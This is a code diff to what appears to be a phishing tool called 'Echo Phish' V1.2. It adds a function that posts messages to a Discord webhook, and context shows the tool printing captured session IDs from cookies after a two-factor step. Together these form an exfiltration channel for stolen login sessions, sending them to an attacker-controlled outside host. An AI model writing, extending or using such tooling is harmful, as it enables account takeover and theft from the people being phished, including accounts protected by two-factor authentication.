@@ -1,5 +1,29 @@
 import json
 from colorama import Fore, Style
+import requests
+from dotenv import load_dotenv
+import os
+
+load_dotenv()
+DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
+
+def send_webhook_message( message):
+    webhook_url = DISCORD_WEBHOOK_URL
+    if webhook_url=="":
+        return "Webhook url is empty"
+    data = {
+        "content": "```\n" + message + "```"
+    }
+    headers = {
+        'Content-Type': 'application/json',
+    }
+    try:
+        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
+        response.raise_for_status()
+        print(f"\n{Fore.GREEN}Message sent to Discord.{Style.RESET_ALL}")
+    except requests.exceptions.RequestException as e:
+        print(f"\n{Fore.RED}Error sending message to Discord: {e}{Style.RESET_ALL}")
+
 
 def capture_information(filename, n):
     with open(filename, 'r') as f:
@@ -81,3 +105,19 @@ def twoFA_correct(cookies):
 | Sessionid:   {Fore.GREEN}{cookies[1]}                                               
 {Fore.YELLOW} --------------------------------------------"""
     print(message)
+
+
+def banner1():
+    banner=f"""{Fore.CYAN}{Style.BRIGHT} _____                                                     _____ 
+( ___ )                                                   ( ___ )
+ |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
+ |   |  ______     _             _____  _     _     _      |   | 
+ |   | |  ____|   | |           |  __ \| |   (_)   | |     |   | 
+ |   | | |__   ___| |__   ___   | |__) | |__  _ ___| |__   |   | 
+ |   | |  __| / __| '_ \ / _ \  |  ___/| '_ \| / __| '_ \  |   | 
+ |   | | |___| (__| | | | (_) | | |    | | | | \__ \ | | | |   | 
+ |   | |______\___|_| |_|\___/  |_|    |_| |_|_|___/_| |_| |   | 
+ |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
+(_____)                                                   (_____){Fore.RESET}{Fore.YELLOW}
+                                                    V1.2\n"""
+    print(banner)
